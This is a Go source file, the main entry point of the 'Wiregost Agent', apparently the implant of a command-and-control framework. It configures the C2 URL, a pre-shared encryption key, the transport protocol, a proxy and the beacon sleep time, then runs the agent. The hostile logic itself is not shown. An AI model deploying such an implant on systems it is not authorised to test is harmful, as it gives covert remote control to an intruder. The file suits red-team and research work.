package main

import (
	// Standard
	"flag"
	"fmt"
	"os"
	"time"

	// 3rd Party
	"github.com/fatih/color"

	wiregost "github.com/maxlandon/wiregost/internal"
	"github.com/maxlandon/wiregost/internal/agent"
)

// GLOBAL VARIABLES
var url = "https://127.0.0.1:443"
var protocol = "h2"
var build = "nonRelease"
var psk = "wiregost"
var proxy = ""
var host = ""

func main() {
	verbose := flag.Bool("v", false, "Enable verbose output")
	version := flag.Bool("version", false, "Print the agent version and exit")
	debug := flag.Bool("debug", false, "Enable debug output")
	flag.StringVar(&url, "url", url, "Full URL for agent to connect to")
	flag.StringVar(&psk, "psk", psk, "Pre-Shared Key used to encrypt initial communications")
	flag.StringVar(&protocol, "proto", protocol, "Protocol for the agent to connect with [https (HTTP/1.1), h2 (HTTP/2), hq (QUIC or HTTP/3.0)]")
	flag.StringVar(&proxy, "proxy", proxy, "Hardcoded proxy to use for http/1.1 traffic only that will override host configuration")
	flag.StringVar(&host, "host", host, "HTTP Host header")
	sleep := flag.Duration("sleep", 30000*time.Millisecond, "Time for agent to sleep")
	flag.Usage = usage
	flag.Parse()

	if *version {
		color.Blue(fmt.Sprintf("Wiregost Agent Version: %s", wiregost.Version))
		color.Blue(fmt.Sprintf("Wiregost Agent Build: %s", build))
		os.Exit(0)
	}

	// Setup and run agent
	a, err := agent.New(protocol, url, host, psk, proxy, *verbose, *debug)
	if err != nil {
		if *verbose {
			color.Red(err.Error())
		}
		os.Exit(1)
	}
	a.WaitTime = *sleep
	errRun := a.Run()
	if errRun != nil {
		if *verbose {
			color.Red(errRun.Error())
		}
		os.Exit(1)
	}
}

// usage prints command line options
func usage() {
	fmt.Printf("Wiregost Agent\r\n")
	flag.PrintDefaults()
	os.Exit(0)
}
